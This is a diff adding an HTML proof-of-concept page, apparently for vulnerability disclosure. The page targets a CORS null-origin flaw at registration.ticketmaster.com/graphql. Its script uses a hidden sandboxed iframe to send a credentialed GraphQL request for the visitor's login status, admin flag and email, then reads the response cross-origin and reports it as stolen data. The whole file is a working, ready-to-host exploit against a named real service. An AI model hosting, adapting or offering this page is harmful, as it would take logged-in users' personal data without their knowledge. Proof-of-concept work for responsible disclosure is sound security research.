@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CORS Null Origin PoC - registration.ticketmaster.com</title>
+<style>
+body { font-family: system-ui, sans-serif; max-width: 800px; margin: 40px auto; padding: 0 20px; background: #f8f8f8; }
+h1 { font-size: 20px; color: #c0392b; }
+.box { background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 16px; margin: 12px 0; }
+pre { background: #1e1e1e; color: #d4d4d4; padding: 14px; border-radius: 6px; overflow-x: auto; font-size: 13px; white-space: pre-wrap; }
+.red { color: #e74c3c; font-weight: bold; }
+.green { color: #27ae60; font-weight: bold; }
+button { background: #c0392b; color: #fff; border: none; padding: 12px 28px; font-size: 15px; border-radius: 6px; cursor: pointer; }
+button:hover { background: #a93226; }
+button:disabled { background: #999; }
+#log { margin-top: 12px; }
+.log-line { padding: 4px 0; border-bottom: 1px solid #eee; font-size: 14px; }
+</style>
+</head>
+<body>
+
+<h1>CORS Null Origin PoC: registration.ticketmaster.com/graphql</h1>
+
+<div class="box">
+<strong>What this page does:</strong><br>
+Creates a <code>&lt;iframe sandbox="allow-scripts"&gt;</code> (which the browser assigns <code>Origin: null</code>),
+sends a credentialed GraphQL request to registration.ticketmaster.com, and reads the response cross-origin.
+<br><br>
+<strong>This page is hosted at:</strong> <span id="hosting"></span><br>
+<strong>Parent origin:</strong> <span id="parentOrigin"></span><br>
+<strong>Iframe origin:</strong> <code>null</code> (forced by sandbox attribute)
+</div>
+
+<div class="box">
+<button id="btn" onclick="runPoC()">Run PoC: steal GraphQL data via CORS null</button>
+<div id="log"></div>
+</div>
+
+<div id="result" style="display:none">
+<div class="box">
+<h3 id="verdict"></h3>
+<pre id="output"></pre>
+</div>
+</div>
+
+<script>
+document.getElementById('hosting').textContent = location.href;
+document.getElementById('parentOrigin').textContent = location.origin;
+
+function log(msg) {
+  var d = document.getElementById('log');
+  var p = document.createElement('div');
+  p.className = 'log-line';
+  p.innerHTML = '[' + new Date().toISOString().substr(11,8) + '] ' + msg;
+  d.appendChild(p);
+}
+
+function runPoC() {
+  var btn = document.getElementById('btn');
+  btn.disabled = true;
+  log('Creating sandboxed iframe (sandbox="allow-scripts", no allow-same-origin)');
+  log('The iframe will have Origin: null regardless of this page\'s origin (' + location.origin + ')');
+
+  var iframe = document.createElement('iframe');
+  iframe.sandbox = 'allow-scripts';
+  iframe.style.display = 'none';
+  iframe.srcdoc = '<scr' + 'ipt>' +
+    'var startTime = Date.now();' +
+    'parent.postMessage({type:"log",msg:"Iframe created. My origin is: " + (typeof origin !== "undefined" ? origin : "null/opaque")}, "*");' +
+    'parent.postMessage({type:"log",msg:"Sending fetch to registration.ticketmaster.com/graphql with credentials:include"}, "*");' +
+    'fetch("https://registration.ticketmaster.com/graphql", {' +
+    '  method: "POST",' +
+    '  credentials: "include",' +
+    '  headers: {"Content-Type": "application/json"},' +
+    '  body: JSON.stringify({query: "{ viewer { isLoggedIn isAdmin email } }"})' +
+    '}).then(function(r){' +
+    '  parent.postMessage({type:"log",msg:"Got HTTP " + r.status + " response in " + (Date.now()-startTime) + "ms"}, "*");' +
+    '  var acao = r.headers.get("access-control-allow-origin");' +
+    '  var acac = r.headers.get("access-control-allow-credentials");' +
+    '  parent.postMessage({type:"log",msg:"ACAO: " + acao + " | ACAC: " + acac}, "*");' +
+    '  return r.json();' +
+    '}).then(function(d){' +
+    '  parent.postMessage({type:"poc",data:d}, "*");' +
+    '}).catch(function(e){' +
+    '  parent.postMessage({type:"poc",error:e.message}, "*");' +
+    '});' +
+    '<\/scr' + 'ipt>';
+
+  window.addEventListener('message', function handler(e) {
+    if (!e.data || !e.data.type) return;
+    if (e.data.type === 'log') {
+      log(e.data.msg);
+      return;
+    }
+    if (e.data.type === 'poc') {
+      window.removeEventListener('message', handler);
+      var result = document.getElementById('result');
+      var verdict = document.getElementById('verdict');
+      var output = document.getElementById('output');
+      result.style.display = 'block';
+
+      if (e.data.error) {
+        verdict.innerHTML = '<span class="red">CORS BLOCKED (not vulnerable)</span>';
+        output.textContent = 'Error: ' + e.data.error;
+        log('RESULT: CORS blocked the read. Not vulnerable.');
+      } else {
+        var jsonStr = JSON.stringify(e.data.data, null, 2);
+        verdict.innerHTML = '<span class="green">DATA STOLEN cross-origin via CORS null</span>';
+        output.textContent = 'Stolen from: https://registration.ticketmaster.com/graphql\n' +
+          'Read by iframe at: Origin: null (sandboxed)\n' +
+          'Parent page at: ' + location.origin + '\n\n' +
+          jsonStr;
+        log('RESULT: Cross-origin read SUCCEEDED. Data stolen.');
+        if (e.data.data && e.data.data.data && e.data.data.data.viewer) {
+          var v = e.data.data.data.viewer;
+          if (v.isLoggedIn) {
+            log('<span class="red">AUTHENTICATED USER DATA STOLEN: email=' + v.email + ', isAdmin=' + v.isAdmin + '</span>');
+          } else {
+            log('User not logged in, but the cross-origin READ succeeded (CORS headers allowed it). If the victim were logged in, their email and session data would be stolen.');
+          }
+        }
+      }
+      btn.disabled = false;
+    }
+  });
+
+  document.body.appendChild(iframe);
+  log('Iframe appended to DOM. Waiting for cross-origin response...');
+}
+</script>
+</body>
+</html>
